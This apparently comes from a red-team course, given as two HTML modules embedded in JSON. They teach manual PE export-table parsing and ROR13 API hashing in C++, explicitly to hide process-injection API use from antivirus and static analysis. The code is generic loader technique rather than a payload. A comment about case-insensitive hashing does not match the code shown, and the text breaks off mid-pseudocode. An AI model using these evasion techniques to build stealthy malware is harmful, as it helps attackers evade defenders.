    "module-6": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 6: module_6</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, buckle up! We&#39;ve laid the groundwork by understanding process internals, threads, and different execution contexts. We&#39;ve even dipped our toes into APCs, Native API, and Fibers. But let&#39;s be honest, a tool that statically imports <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code>, or even <code>NtCreateThreadEx</code> is screaming &quot;look at me!&quot; to security products.</p>\n<p>In this module, we&#39;re leveling up our stealth game significantly. We&#39;re going to tackle the fundamental problem of static imports and learn how to make our tools resolve the necessary Windows API functions <em>dynamically</em> at runtime. This means analyzing the Portable Executable (PE) format ourselves, just like the Windows loader does, to find the addresses of the functions we need. This is a cornerstone technique in sophisticated malware and red team tools, and it draws heavily from the kind of low-level PE manipulation concepts you&#39;d find discussed in places like <code>zhasslan.txt</code>.</p>\n<p>Let&#39;s dive deep into the guts of the PE format and build our own dynamic resolver!</p>\n<hr>\n<h2>Module 6: Stealth Operations - Dynamic API Resolution and Export Tables</h2>\n<p><strong>Module Objective:</strong> Understand the necessity of hiding API calls from static analysis and implement the core logic to dynamically resolve required API function addresses at runtime by parsing the Portable Execable (PE) format&#39;s Export Directory.</p>\n<p><strong>Estimated Time:</strong> 4-6 hours (including coding and debugging)</p>\n<h3>6.1 The Problem with Static Imports (IAT)</h3>\n<p>Okay, let&#39;s start with <em>why</em> we&#39;re doing this. When you write a typical C/C++ program that calls Windows API functions like <code>MessageBoxA</code>, <code>CreateFileA</code>, or <code>VirtualAlloc</code>, the compiler and linker work together to create an Import Address Table (IAT) in your executable&#39;s PE header.</p>\n<ul>\n<li><strong>What is the IAT?</strong> It&#39;s essentially a list of all the functions your program intends to import from external DLLs (like <code>kernel32.dll</code>, <code>user32.dll</code>).</li>\n<li><strong>How does it work?</strong> The IAT contains entries for each imported function. Initially, these entries might hold hints (like the function name or ordinal). When the Windows loader maps your executable into memory, it finds the required DLLs, resolves the actual memory addresses of those functions within the loaded DLLs, and patches the IAT entries in your executable with those addresses. Your code then calls the function indirectly via the IAT entry.</li>\n<li><strong>The Security Problem:</strong> Static analysis tools, antivirus engines, and even simple command-line utilities like <code>dumpbin</code> can easily parse your executable&#39;s PE header and read the IAT. They can see exactly which functions from which DLLs your program <em>intends</em> to use <em>before</em> it even runs. If your program imports <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>, that&#39;s a pretty strong indicator that it might be doing process injection. This provides a static signature that&#39;s easy for defenders to detect.</li>\n</ul>\n<p>Our goal is to eliminate or minimize this static footprint. We want our executable to look like it imports very little (maybe just a few basic functions needed to <em>start</em> our custom loader), and then have our loader code dynamically find and call all the sensitive APIs at runtime.</p>\n<h3>6.2 How the Windows Loader Resolves Imports (A Quick Look)</h3>\n<p>To understand how to <em>manually</em> resolve APIs, it helps to know how the OS loader does it. When the loader loads an executable or a DLL:</p>\n<ol>\n<li>It reads the PE header, specifically the Import Directory.</li>\n<li>For each required DLL listed in the Import Directory, it loads that DLL into memory.</li>\n<li>For each function listed in the IAT for that DLL:<ul>\n<li>It looks up the function&#39;s address within the <em>Export Directory</em> of the loaded DLL.</li>\n<li>It writes the resolved address into the corresponding IAT entry of the importing module.</li>\n</ul>\n</li>\n</ol>\n<p>Our dynamic resolution will mimic step 3, but <em>our code</em> will do the lookup by parsing the target DLL&#39;s Export Directory, rather than the OS loader doing it based on our IAT.</p>\n<h3>6.3 Diving into the PE Format: Focus on the Export Directory</h3>\n<p>The Portable Executable (PE) format is the structure of executables (<code>.exe</code>), DLLs (<code>.dll</code>), and object files (<code>.obj</code>) on Windows. While complex, we only need to understand specific parts to implement dynamic API resolution.</p>\n<p>We need to navigate a series of structures starting from the base address of a loaded module (like <code>kernel32.dll</code>).</p>\n<ol>\n<li><p><strong>DOS Header (<code>IMAGE_DOS_HEADER</code>)</strong>: The very beginning of the file/module. It&#39;s a legacy structure from MS-DOS days.</p>\n<ul>\n<li>We need the <code>e_lfanew</code> field. This is a <code>LONG</code> (32-bit offset) that points to the start of the <code>IMAGE_NT_HEADERS</code>. It&#39;s an <strong>RVA</strong> (Relative Virtual Address) from the base of the module.</li>\n</ul>\n</li>\n<li><p><strong>NT Headers (<code>IMAGE_NT_HEADERS</code>)</strong>: This structure contains core information about the PE file.</p>\n<ul>\n<li>It starts with a <code>Signature</code> (<code>DWORD</code>) which should be <code>IMAGE_NT_SIGNATURE</code> (0x00004550, or &quot;PE\\0\\0&quot;). Always check this for validation!</li>\n<li>It contains an <code>IMAGE_FILE_HEADER</code> (which isn&#39;t critical for us here).</li>\n<li>Crucially, it contains the <code>IMAGE_OPTIONAL_HEADER</code>.</li>\n</ul>\n</li>\n<li><p><strong>Optional Header (<code>IMAGE_OPTIONAL_HEADER</code>)</strong>: Despite the name, this header is essential for executables and DLLs. It contains vital information about the layout and properties of the image in memory.</p>\n<ul>\n<li>We need the <code>DataDirectory</code> field. This is an array of <code>IMAGE_DATA_DIRECTORY</code> structures. Each entry points to a different important data structure (like the Import Directory, Export Directory, Resource Directory, etc.) and gives its size.</li>\n<li>The <code>DataDirectory</code> array has a fixed number of entries, defined by <code>IMAGE_NUMBEROF_DIRECTORY_ENTRIES</code> (usually 16). The <em>first</em> entry (index 0) is the <strong>Export Directory</strong>.</li>\n</ul>\n</li>\n<li><p><strong>Data Directory (<code>IMAGE_DATA_DIRECTORY</code>)</strong>: Each entry in the <code>DataDirectory</code> array has two fields:</p>\n<ul>\n<li><code>VirtualAddress</code>: The <strong>RVA</strong> of the data structure (e.g., the Export Directory Table).</li>\n<li><code>Size</code>: The size of the data structure.</li>\n</ul>\n</li>\n<li><p><strong>Export Directory Table (<code>IMAGE_EXPORT_DIRECTORY</code>)</strong>: This is the structure we finally reach by following the RVA from the first <code>IMAGE_DATA_DIRECTORY</code> entry. It contains the information needed to find exported functions.</p>\n<ul>\n<li><code>Base</code>: The starting ordinal number for the functions exported by ordinal.</li>\n<li><code>NumberOfFunctions</code>: Total number of exported functions.</li>\n<li><code>NumberOfNames</code>: Number of exported functions that have names (i.e., listed in the <code>AddressOfNames</code> array). Functions can be exported <em>only</em> by ordinal, or by both name and ordinal.</li>\n<li><code>AddressOfFunctions</code>: An <strong>RVA</strong> to an array of RVAs. This is the <strong>Export Address Table (EAT)</strong>. Each entry in this array is the RVA of an exported function&#39;s entry point. The index into this array is <code>Ordinal - Base</code>.</li>\n<li><code>AddressOfNames</code>: An <strong>RVA</strong> to an array of RVAs. Each entry in this array is the RVA of a null-terminated ASCII string containing the name of an exported function.</li>\n<li><code>AddressOfNameOrdinals</code>: An <strong>RVA</strong> to an array of <code>WORD</code>s. This array maps the index from the <code>AddressOfNames</code> array to the corresponding ordinal number of the function. If a function is the <code>i</code>-th name in the <code>AddressOfNames</code> array, its ordinal is <code>AddressOfNameOrdinals[i]</code>.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Putting it Together: The Lookup Process</strong></p>\n<p>To find the address of a function by name (e.g., &quot;CreateProcessA&quot;) in a loaded module (e.g., <code>kernel32.dll</code>) at address <code>hModule</code>:</p>\n<ol>\n<li>Calculate the address of the DOS Header: <code>dosHeader = (IMAGE_DOS_HEADER*)hModule</code>.</li>\n<li>Validate the DOS Header signature (<code>dosHeader-&gt;e_magic == IMAGE_DOS_SIGNATURE</code>).</li>\n<li>Calculate the address of the NT Headers: <code>ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader-&gt;e_lfanew)</code>.</li>\n<li>Validate the NT Headers signature (<code>ntHeaders-&gt;Signature == IMAGE_NT_SIGNATURE</code>).</li>\n<li>Get the address of the Optional Header: <code>optionalHeader = &amp;ntHeaders-&gt;OptionalHeader</code>.</li>\n<li>Get the address of the Data Directories array: <code>dataDir = optionalHeader-&gt;DataDirectory</code>.</li>\n<li>Check if the Export Directory entry is valid (i.e., <code>dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].Size &gt; 0</code>).</li>\n<li>Calculate the address of the Export Directory Table: <code>exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + dataDir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)</code>.</li>\n<li>Calculate the base addresses of the three key arrays by adding their RVAs (from <code>exportDir</code>) to the module base address (<code>hModule</code>):<ul>\n<li><code>addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDir-&gt;AddressOfFunctions)</code></li>\n<li><code>addressOfNames = (DWORD*)((BYTE*)hModule + exportDir-&gt;AddressOfNames)</code></li>\n<li><code>addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDir-&gt;AddressOfNameOrdinals)</code></li>\n</ul>\n</li>\n<li>Iterate through the <code>AddressOfNames</code> array from index 0 to <code>exportDir-&gt;NumberOfNames - 1</code>.</li>\n<li>For each index <code>i</code>:<ul>\n<li>Get the RVA of the function name string: <code>nameRVA = addressOfNames[i]</code>.</li>\n<li>Calculate the address of the function name string: <code>functionName = (char*)((BYTE*)hModule + nameRVA)</code>.</li>\n<li>Compare <code>functionName</code> with the target function name string (e.g., &quot;CreateProcessA&quot;) using <code>strcmp</code>.</li>\n</ul>\n</li>\n<li>If <code>strcmp</code> returns 0 (names match):<ul>\n<li>Get the function&#39;s ordinal from the <code>AddressOfNameOrdinals</code> array using the current index <code>i</code>: <code>ordinal = addressOfNameOrdinals[i]</code>.</li>\n<li>Get the function&#39;s RVA from the <code>AddressOfFunctions</code> array using the ordinal: <code>functionRVA = addressOfFunctions[ordinal]</code>.</li>\n<li>Calculate the function&#39;s virtual address (the actual memory address where the code starts): <code>functionAddress = (void*)((BYTE*)hModule + functionRVA)</code>.</li>\n<li>Return <code>functionAddress</code>.</li>\n</ul>\n</li>\n<li>If the loop finishes without finding the name, the function is not exported by name (or doesn&#39;t exist), return <code>NULL</code>.</li>\n</ol>\n<p><strong>Handling Ordinal Exports and Forwarders:</strong></p>\n<ul>\n<li><strong>Ordinal Exports:</strong> Some functions are <em>only</em> exported by ordinal, not by name. Our current algorithm (which iterates <code>AddressOfNames</code>) won&#39;t find these. To find functions by ordinal, you&#39;d calculate the index into <code>AddressOfFunctions</code> as <code>Ordinal - Base</code> and retrieve the RVA directly. For this module&#39;s project, finding by name is sufficient, but be aware of ordinal-only exports.</li>\n<li><strong>Forwarders:</strong> An export can sometimes be a &quot;forwarder&quot; string (e.g., &quot;NtCreateThreadEx&quot; in <code>kernel32.dll</code> is forwarded to &quot;NtCreateThreadEx&quot; in <code>ntdll.dll</code>). The RVA in the EAT points to a string like <code>&quot;ntdll.NtCreateThreadEx&quot;</code> instead of code. Our simple RVA-to-VA conversion will yield a pointer to this string. A robust resolver needs to detect if an RVA falls within the Export Directory itself and, if so, parse the forwarder string, load the target DLL (if not already loaded), and resolve the function in the target DLL. This adds complexity. For this module, we will primarily focus on resolving non-forwarded functions or assume we handle forwarders by resolving the <em>target</em> function in the <em>target</em> DLL manually (e.g., resolve <code>NtCreateThreadEx</code> directly from <code>ntdll.dll</code> instead of <code>kernel32.dll</code>).</li>\n</ul>\n<h3>6.4 Implementing the Manual PE Parser and Resolver</h3>\n<p>Let&#39;s translate the algorithm into C++ code. We&#39;ll need Windows headers for the PE structure definitions.</p>\n<pre><code class=\"language-c++\">#include &lt;windows.h&gt;\n#include &lt;winternl.h&gt; // For PE structure definitions (like IMAGE_NT_HEADERS)\n#include &lt;stdio.h&gt;    // For printf\n#include &lt;string.h&gt;   // For strcmp\n\n// Define necessary PE structures if winternl.h isn&#39;t available or sufficient\n// (winternl.h is usually sufficient on modern MSVC)\n#ifndef IMAGE_NT_SIGNATURE\n#define IMAGE_NT_SIGNATURE    0x00004550  // PE00\n#endif\n\n#ifndef IMAGE_DOS_SIGNATURE\n#define IMAGE_DOS_SIGNATURE   0x5A4D      // MZ\n#endif\n\n// IMAGE_DIRECTORY_ENTRY_EXPORT is typically defined as 0\n\n/*\n * ManualGetProcAddress: Dynamically resolves the address of an exported function\n *                        within a loaded module by manually parsing its PE header.\n *\n * hModule: Base address of the loaded module (e.g., HMODULE from GetModuleHandle).\n * lpProcName: Name of the function to resolve (ASCII string).\n *\n * Returns: The address of the function if found, NULL otherwise.\n */\nvoid* ManualGetProcAddress(HMODULE hModule, const char* lpProcName) {\n    // Validate module handle\n    if (!hModule) {\n        fprintf(stderr, &quot;Error: Invalid module handle.\\n&quot;);\n        return NULL;\n    }\n\n    // 1. Get the DOS header\n    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;\n\n    // 2. Validate DOS header signature\n    if (dosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {\n        fprintf(stderr, &quot;Error: Invalid DOS signature.\\n&quot;);\n        return NULL;\n    }\n\n    // 3. Get the NT headers using e_lfanew\n    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader-&gt;e_lfanew);\n\n    // 4. Validate NT headers signature\n    if (ntHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {\n        fprintf(stderr, &quot;Error: Invalid NT signature.\\n&quot;);\n        return NULL;\n    }\n\n    // 5. Get the Optional Header (contains Data Directories)\n    // 6. Get the Data Directories array from the Optional Header\n    PIMAGE_DATA_DIRECTORY dataDirectory = ntHeaders-&gt;OptionalHeader.DataDirectory;\n\n    // 7. Check if the Export Directory exists (entry 0)\n    if (dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == 0) {\n        fprintf(stderr, &quot;Error: Module has no export directory.\\n&quot;);\n        return NULL;\n    }\n\n    // 8. Calculate the address of the Export Directory Table\n    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n\n    // 9. Calculate the base addresses of the three key arrays\n    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfFunctions);\n    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNames);\n    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory-&gt;AddressOfNameOrdinals);\n\n    // 10. Iterate through the array of function names\n    for (DWORD i = 0; i &lt; exportDirectory-&gt;NumberOfNames; i++) {\n        // Get the RVA of the current function name string\n        DWORD nameRVA = addressOfNames[i];\n        // Calculate the address of the function name string\n        char* functionName = (char*)((BYTE*)hModule + nameRVA);\n\n        // 11. Compare the current function name with the target name\n        if (strcmp(functionName, lpProcName) == 0) {\n            // 12. If names match, get the ordinal from the ordinal array\n            WORD ordinal = addressOfNameOrdinals[i];\n\n            // Get the RVA of the function&#39;s entry point from the address array\n            DWORD functionRVA = addressOfFunctions[ordinal];\n\n            // Check for forwarded exports (RVA points inside the export directory itself)\n            // This is a basic check; a full implementation would parse the forwarder string\n            // For this module, we&#39;ll assume non-forwarded functions or handle specific ones\n            // by resolving the target directly (e.g., ntdll!NtCreateThreadEx)\n             if (functionRVA &gt;= dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress &amp;&amp;\n                functionRVA &lt; dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress + dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size)\n            {\n                 // This RVA points into the export directory, likely a forwarder string.\n                 // We are not handling forwarders in this basic implementation.\n                 // You would typically read the string here and resolve the target.\n                 fprintf(stderr, &quot;Warning: Function &#39;%s&#39; appears to be a forwarder. Not resolved.\\n&quot;, lpProcName);\n                 return NULL; // Or implement forwarder resolution\n            }\n\n            // Calculate the function&#39;s virtual address\n            void* functionAddress = (void*)((BYTE*)hModule + functionRVA);\n\n            // Return the function address\n            return functionAddress;\n        }\n    }\n\n    // 13. Function not found by name\n    fprintf(stderr, &quot;Error: Function &#39;%s&#39; not found in module exports.\\n&quot;, lpProcName);\n    return NULL;\n}\n\n// --- Example Usage ---\nint main() {\n    // For demonstration in this module, we&#39;ll use GetModuleHandleA to get the base address.\n    // In a true stealth scenario, you would find module base addresses manually (e.g., via PEB walk).\n    HMODULE hKernel32 = GetModuleHandleA(&quot;kernel32.dll&quot;);\n\n    if (!hKernel32) {\n        fprintf(stderr, &quot;Error: Could not get handle for kernel32.dll\\n&quot;);\n        return 1;\n    }\n\n    printf(&quot;kernel32.dll base address: %p\\n&quot;, hKernel32);\n\n    // Try resolving a standard WinAPI function\n    const char* funcName = &quot;CreateProcessA&quot;;\n    void* pfnCreateProcessA = ManualGetProcAddress(hKernel32, funcName);\n\n    if (pfnCreateProcessA) {\n        printf(&quot;Resolved address of %s: %p\\n&quot;, funcName, pfnCreateProcessA);\n\n        // You could now cast pfnCreateProcessA to the correct function pointer type\n        // and call it, e.g.:\n        // typedef BOOL (WINAPI* fnCreateProcessA)(\n        //    LPCSTR                lpApplicationName,\n        //    LPSTR                 lpCommandLine,\n        //    LPSECURITY_ATTRIBUTES lpProcessAttributes,\n        //    LPSECURITY_ATTRIBUTES lpThreadAttributes,\n        //    BOOL                  bInheritHandles,\n        //    DWORD                 dwCreationFlags,\n        //    LPVOID                lpEnvironment,\n        //    LPCSTR                lpCurrentDirectory,\n        //    LPSTARTUPINFOA        lpStartupInfo,\n        //    LPPROCESS_INFORMATION lpProcessInformation\n        // );\n        // fnCreateProcessA pfn = (fnCreateProcessA)pfnCreateProcessA;\n        // ... use pfn to call CreateProcessA ...\n\n    } else {\n        fprintf(stderr, &quot;Failed to resolve %s\\n&quot;, funcName);\n    }\n\n     // Try resolving another function\n    const char* funcName2 = &quot;VirtualAllocEx&quot;;\n    void* pfnVirtualAllocEx = ManualGetProcAddress(hKernel32, funcName2);\n\n    if (pfnVirtualAllocEx) {\n        printf(&quot;Resolved address of %s: %p\\n&quot;, funcName2, pfnVirtualAllocEx);\n    } else {\n        fprintf(stderr, &quot;Failed to resolve %s\\n&quot;, funcName2);\n    }\n\n    // Try resolving a function that might not exist or be exported by name\n    const char* funcName3 = &quot;NonExistentFunction&quot;;\n     void* pfnNonExistent = ManualGetProcAddress(hKernel32, funcName3);\n\n    if (pfnNonExistent) {\n        printf(&quot;Resolved address of %s: %p\\n&quot;, funcName3, pfnNonExistent);\n    } else {\n        fprintf(stderr, &quot;Failed to resolve %s (Expected failure)\\n&quot;, funcName3);\n    }\n\n    // Note: For resolving NTAPI functions like NtAllocateVirtualMemory,\n    // you would typically get the handle for &quot;ntdll.dll&quot; and parse its exports.\n    // HMODULE hNtdll = GetModuleHandleA(&quot;ntdll.dll&quot;);\n    // void* pfnNtAllocateVirtualMemory = ManualGetProcAddress(hNtdll, &quot;NtAllocateVirtualMemory&quot;);\n    // ...\n\n    return 0;\n}\n</code></pre>\n<p><strong>Explanation of the Code:</strong></p>\n<ol>\n<li><strong>Includes:</strong> We need <code>windows.h</code> for basic Windows types, <code>winternl.h</code> for the PE structure definitions (like <code>IMAGE_NT_HEADERS</code>, <code>IMAGE_EXPORT_DIRECTORY</code>, etc.), and standard C headers for printing and string comparison.</li>\n<li><strong>Structure Definitions:</strong> We include checks for <code>IMAGE_NT_SIGNATURE</code> and <code>IMAGE_DOS_SIGNATURE</code> in case <code>winternl.h</code> or the environment doesn&#39;t define them, but typically, these are standard. <code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> is defined as 0, representing the first entry in the Data Directory.</li>\n<li><strong><code>ManualGetProcAddress</code> Function:</strong><ul>\n<li>Takes <code>hModule</code> (the base address of the DLL/EXE) and <code>lpProcName</code> (the name string) as input.</li>\n<li>Uses pointer arithmetic (<code>(BYTE*)hModule + offset</code>) to navigate through the PE structure in memory. Remember, <code>hModule</code> is the base, and RVAs are offsets <em>from that base</em>.</li>\n<li>Performs validation checks (<code>e_magic</code>, <code>Signature</code>, <code>Export Directory Size &gt; 0</code>) at each major step. Robust code <em>always</em> validates!</li>\n<li>Calculates the addresses of the <code>IMAGE_EXPORT_DIRECTORY</code> and the three associated arrays (<code>AddressOfFunctions</code>, <code>AddressOfNames</code>, <code>AddressOfNameOrdinals</code>) by adding their RVAs to the module base.</li>\n<li>Loops through the <code>AddressOfNames</code> array.</li>\n<li>Inside the loop, it calculates the address of each exported function&#39;s name string and uses <code>strcmp</code> to compare it to the target name.</li>\n<li>If a match is found, it uses the corresponding entry in <code>AddressOfNameOrdinals</code> to get the function&#39;s ordinal.</li>\n<li>It then uses the ordinal as an index into the <code>AddressOfFunctions</code> (EAT) to get the function&#39;s RVA.</li>\n<li>A basic check is added for forwarders (if the RVA points back into the export directory range). For this module, we&#39;re just printing a warning and returning NULL for simplicity, but a real-world resolver would handle this recursively.</li>\n<li>Finally, it calculates the function&#39;s absolute virtual address by adding the function RVA to the module base address and returns it as a <code>void*</code>.</li>\n<li>If the loop finishes without finding the name, it returns <code>NULL</code>.</li>\n</ul>\n</li>\n<li><strong><code>main</code> Function (Example Usage):</strong><ul>\n<li>For demonstration <em>in this module</em>, we use <code>GetModuleHandleA(&quot;kernel32.dll&quot;)</code> to get the base address of <code>kernel32.dll</code>. <strong>Crucially, in a truly stealthy tool, you would NOT use <code>GetModuleHandleA</code> as it&#39;s a static import itself!</strong> We will discuss how to find module bases manually in the next module (PEB walk).</li>\n<li>It calls our <code>ManualGetProcAddress</code> function to resolve <code>CreateProcessA</code> and <code>VirtualAllocEx</code>.</li>\n<li>It prints the resolved addresses.</li>\n<li>It includes commented-out code showing how you would cast the returned <code>void*</code> to a function pointer type to actually call the function.</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-7": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 7: module_7</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome back! We&#39;ve come a long way from just understanding process basics. In Module 6, we cracked open the PE format and learned how to find API function addresses manually at runtime. That was a massive leap towards stealth, getting rid of those tell-tale static imports.</p>\n<p>But guess what? We can go deeper! While manually parsing the EAT is great, if our code still contains the <em>literal strings</em> &quot;kernel32.dll&quot;, &quot;VirtualAllocEx&quot;, &quot;CreateRemoteThread&quot;, etc., static analysis tools or even simple memory scanners looking for known API names can still flag our payload.</p>\n<p>This module is all about <em>hiding</em> our intentions and the tools we&#39;re using. We&#39;re going to make it much harder for defenders to see which APIs we&#39;re calling and even make our code&#39;s structure less obvious. We&#39;ll draw inspiration from some nasty real-world malware and the principles laid out in texts like <code>zhasslan.txt</code> – the idea of obscuring your code&#39;s purpose and execution flow.</p>\n<p>Get ready to dive into API hashing, string obfuscation, and a brief peek into the world of direct syscalls.</p>\n<hr>\n<h2><strong>Module 7: Advanced Evasion - Hiding API Calls and Other Techniques</strong></h2>\n<ul>\n<li><strong>Module Objective:</strong> Implement advanced techniques to further obscure the use of system APIs and the presence of malicious code, including hashing API names, string obfuscation, and understanding the role of direct syscalls.</li>\n</ul>\n<hr>\n<h3><strong>7.1 The Problem with Cleartext API Names</strong></h3>\n<p>Let&#39;s quickly recap Module 6. We learned to do this:</p>\n<ol>\n<li>Get the base address of a loaded module (like <code>kernel32.dll</code>).</li>\n<li>Manually parse its PE header to find the Export Directory.</li>\n<li>Iterate through the exported function names.</li>\n<li>Compare the name string from the EAT with the name string of the function we want (e.g., &quot;VirtualAllocEx&quot;).</li>\n<li>If they match, calculate the function&#39;s address using the EAT data.</li>\n</ol>\n<p>This successfully avoids having &quot;VirtualAllocEx&quot; in our Import Address Table (IAT). <em>However</em>, the string &quot;VirtualAllocEx&quot; (or &quot;kernel32.dll&quot;) likely still exists <em>somewhere</em> in our code or data section, because we need it as input to our custom <code>GetProcAddress</code>-like function.</p>\n<p>Security tools perform static analysis. They scan executable files and memory for patterns. Literal strings referencing sensitive APIs are <em>strong</em> indicators of potentially malicious activity. Even if you&#39;re dynamically resolving, if the string &quot;NtAllocateVirtualMemory&quot; is sitting there waiting to be looked up, it&#39;s a red flag.</p>\n<p>Our goal in evasion is to break these static patterns and make the code harder to understand without dynamic execution and often, complex runtime analysis.</p>\n<h3><strong>7.2 Improving Dynamic Resolution: API Hashing</strong></h3>\n<p>The solution to the cleartext string problem is <strong>API Hashing</strong>. Instead of searching the EAT for a <em>string</em> match, we search for a <em>hash</em> match.</p>\n<p>Here&#39;s the concept:</p>\n<ol>\n<li>We decide on a simple, fast hashing algorithm.</li>\n<li>When we want to look up a function (say, <code>VirtualAllocEx</code>), we calculate the hash of &quot;VirtualAllocEx&quot; <em>at compile time</em> or store a pre-calculated hash value.</li>\n<li>Our dynamic resolution function now takes this <em>hash value</em> as input, instead of the string name.</li>\n<li>Inside the dynamic resolution function (our custom <code>GetProcAddress</code>), as we iterate through the EAT&#39;s exported names, we calculate the hash of <em>each exported name</em> we encounter.</li>\n<li>We compare this calculated hash with the target hash provided as input.</li>\n<li>If the hashes match, we&#39;ve found our function! We return its address.</li>\n</ol>\n<p>Now, the string &quot;VirtualAllocEx&quot; never needs to appear in our code&#39;s static form. Only the <em>hash value</em> does, which is just a number and much less suspicious than the string itself.</p>\n<h4><strong>Choosing a Hashing Algorithm</strong></h4>\n<p>For malware and shellcode, the hashing algorithm needs to be:</p>\n<ul>\n<li><strong>Simple and Fast:</strong> It will be executed repeatedly during the EAT traversal. Complex algorithms add overhead.</li>\n<li><strong>Small Code Size:</strong> Especially critical for shellcode where every byte counts.</li>\n<li><strong>Reasonably Unique:</strong> While collisions are possible with simple hashes, they should be rare enough for typical API sets.</li>\n</ul>\n<p>Common choices include:</p>\n<ul>\n<li><strong>ROR13 (Rotate Right by 13):</strong> A very simple and widely used hash in malware. It iterates through the string, rotating a running hash value right by 13 bits and adding the current character.</li>\n<li><strong>DJB2:</strong> Another simple, non-cryptographic hash.</li>\n</ul>\n<p>Let&#39;s implement a basic ROR13 hash function as an example.</p>\n<pre><code class=\"language-c++\">#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n\n// Simple ROR13 hash function\nDWORD ROR13Hash(const char* name) {\n    DWORD hash = 0;\n    while (*name) {\n        // Rotate right by 13 bits\n        hash = (hash &gt;&gt; 13) | (hash &lt;&lt; (32 - 13));\n        // Add the current character (case-insensitive for API names)\n        hash += static_cast&lt;DWORD&gt;(*name);\n        name++;\n    }\n    return hash;\n}\n\nint main() {\n    // Example usage\n    const char* apiName1 = &quot;VirtualAllocEx&quot;;\n    const char* apiName2 = &quot;WriteProcessMemory&quot;;\n    const char* dllName1 = &quot;kernel32.dll&quot;;\n\n    DWORD hash1 = ROR13Hash(apiName1);\n    DWORD hash2 = ROR13Hash(apiName2);\n    DWORD hash3 = ROR13Hash(dllName1);\n\n    std::cout &lt;&lt; &quot;Hash of &quot; &lt;&lt; apiName1 &lt;&lt; &quot;: &quot; &lt;&lt; std::hex &lt;&lt; hash1 &lt;&lt; std::endl;\n    std::cout &lt;&lt; &quot;Hash of &quot; &lt;&lt; apiName2 &lt;&lt; &quot;: &quot; &lt;&lt; std::hex &lt;&lt; hash2 &lt;&lt; std::endl;\n    std::cout &lt;&lt; &quot;Hash of &quot; &lt;&lt; dllName1 &lt;&lt; &quot;: &quot; &lt;&lt; std::hex &lt;&lt; hash3 &lt;&lt; std::endl;\n\n    // Note: In real malware, these hashes would be hardcoded or calculated at compile time\n    // and the strings wouldn&#39;t appear like this.\n\n    return 0;\n}\n</code></pre>\n<p><em>(<strong>Self-Correction/Refinement:</strong> The ROR13 hash implementation above is slightly simplified for clarity. A more common variant uses <code>hash = (hash &lt;&lt; 13) | (hash &gt;&gt; (32 - 13))</code> for ROL13, or uses <code>hash = (hash &gt;&gt; 13) | (hash &lt;&lt; (32 - 13)); hash ^= *name;</code> or similar variations. The core idea remains: a simple bitwise operation and addition/XOR per character. Let&#39;s stick with the provided <code>ROR13Hash</code> as it demonstrates the principle clearly for teaching purposes. The key is that <em>some</em> deterministic hash is used.)</em></p>\n<h4><strong>Integrating Hashing into Dynamic Resolution</strong></h4>\n<p>Now, let&#39;s think about how this changes our <code>GetProcAddress</code>-like function from Module 6.</p>\n<p><strong>Module 6 (Conceptual <code>GetProcAddress</code>):</strong></p>\n<pre><code class=\"language-c++\">// Simplified Pseudocode\nLPVOID CustomGetProcAddress(LPVOID moduleBase, const char* functionName) {\n    // 1. Validate PE header\n    // 2. Find Export Directory RVA\n    // 3. Get AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals arrays\n    // 4. Loop through names:\n    //    For each name_rva in AddressOfNames:\n    //        char* currentName = moduleBase + name_rva;\n    //        If strcmp(currentName, functionName) == 0: // &lt;--- String comparison\n    //            // Found it! Get ordinal and then function address\n    //            DWORD ordinal = AddressOfNameOrdinals[i]; // i is index in names array\n    //            LPVOID functionAddress = moduleBase + AddressOfFunctions[ordinal];\n    //            return functionAddress;\n    // 5. Return NULL if not found\n}\n\n// Usage:\n// LPVOID pVirtualAllocEx = CustomGetProcAddress(hKernel32, &quot;VirtualAllocEx&quot;);\n</code></pre>\n<p><strong>Module 7 (Conceptual Hash-Based <code>GetProcAddress</code>):</strong></p>\n<pre><code class=\"language-c++\">// Simplified Pseudocode\nLPVOID CustomGetProcAddressByHash(LPVOID moduleBase, DWORD functionHash) {\n    // 1. Validate PE header\n    // 2. Find Export Directory RVA\n    // 3. Get AddressOfNames, AddressOfFunctions, AddressOfNameOrdinals arrays\n    // 4. Loop through names:\n    //    For each name_rva in AddressOfNames:\n    //        char* currentName = moduleBase + name_rva;\n    //        DWORD currentNameHash = ROR13Hash(currentName); // &lt;--- Hash calculation\n    //        If currentNameHash == functionHash: // &lt;--- Hash comparison\n    //            // Found it! Get ordinal and then function address\n    //            DWORD ordinal = AddressOfNameOrdinals[i]; // i is index in names array\n    //            LPVOID functionAddress = moduleBase 